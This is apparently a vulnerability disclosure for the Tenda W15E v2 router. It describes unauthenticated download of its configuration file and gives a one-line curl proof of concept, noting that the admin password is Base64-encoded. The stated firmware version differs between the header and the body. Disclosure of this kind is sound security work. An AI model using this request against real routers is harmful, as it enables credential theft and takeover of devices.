**Affected Product**: Tenda W15E v2 Router

**Affected Firmware Versions**:  V15.11.0.6(1068_1546_841)

**Vulnerability Type**: Sensitive Information Leakage

------
### **Vulnerability Description**

The Tenda W15E v2 router firmware version V15.11.0.5 (1068_1546_841) contains an information disclosure vulnerability. The RouterCfm.cfg configuration file can be accessed without authentication through the /cgi-bin/DownloadCfg/RouterCfm.cfg endpoint. This allows remote attackers to obtain sensitive information, including administrative account credentials and other configuration parameters.


---
### **PoC**
`curl http://hostIp:port/cgi-bin/DownloadCfg/RouterCfm.cfg`

![1](./img/43.png)

![2](./img/44.png)

The password can be obtained by Base64 decoding.
